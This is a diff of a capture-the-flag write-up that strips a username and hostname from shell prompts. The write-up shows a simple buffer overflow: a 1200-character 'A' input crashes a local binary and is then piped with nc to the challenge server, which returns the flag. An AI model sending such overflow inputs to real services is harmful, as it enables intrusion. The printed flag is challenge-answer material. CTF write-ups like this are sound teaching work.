@@ -81,9 +81,9 @@ As I initially saw the buffer as 200 chars, I tried sending inputs with more tha
 After sometime, I sent an input with a very high character length after looking up some resources. It caused a segmentation fault!
 
 ```shell
-piyagehi@Piyas-MacBook-Pro:~$ python -c 'print "A"*1200' > file
-piyagehi@Piyas-MacBook-Pro:~$ chmod +x butter_overflow
-piyagehi@Piyas-MacBook-Pro:~$ cat file | ./butter_overflow
+$ python -c 'print "A"*1200' > file
+$ chmod +x butter_overflow
+$ cat file | ./butter_overflow
 How many bytes does it take to overflow this buffer?
 Could not open flag file.
 ```
@@ -91,7 +91,7 @@ Could not open flag file.
 The flag file did not open as there is no flag file on my machine. Since the input worked, I sent the same input to the server for this challenge, and received the flag!
 
 ```shell
-piyagehi@Piyas-MacBook-Pro:~$ cat file | nc challenge.ctf. games 30054
+$ cat file | nc challenge.ctf. games 30054
 How many bytes does it take to overflow this buffer?
 flag{72d8784a5da3a8f56d2106c12dbab989}
 ```
